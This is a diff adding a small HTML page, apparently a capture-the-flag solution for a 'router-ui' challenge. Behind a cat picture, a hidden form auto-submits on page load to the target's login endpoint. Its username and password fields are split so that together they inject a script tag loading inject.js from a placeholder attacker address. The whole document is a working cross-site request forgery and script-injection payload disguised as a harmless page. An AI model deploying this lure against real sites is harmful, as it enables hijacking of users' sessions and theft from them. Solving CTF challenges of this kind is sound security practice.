@@ -1,0 +1,17 @@
+<html>
+  <body>
+    <h1>Isn't she lovely?</h1>
+    <image src="https://www.chewy.com/petcentral/wp-content/uploads/2018/05/fluffy-cat-breeds4-x-670-440x.jpg" />
+    <form id="xss-form" style="display:none;" action="https://router-ui.web.ctfcompetition.com/login" method="post">
+      <input type="text" name="username" value="<script src=https:"/>
+      <input type="text" name="password" value="{adresse}/inject.js</script>"/>
+    </form>
+    <script
+      src="https://code.jquery.com/jquery-3.3.1.min.js"
+      integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
+      crossorigin="anonymous"></script>
+    <script type="text/javascript">
+      $("#xss-form").submit();
+    </script>
+  </body>
+</html>
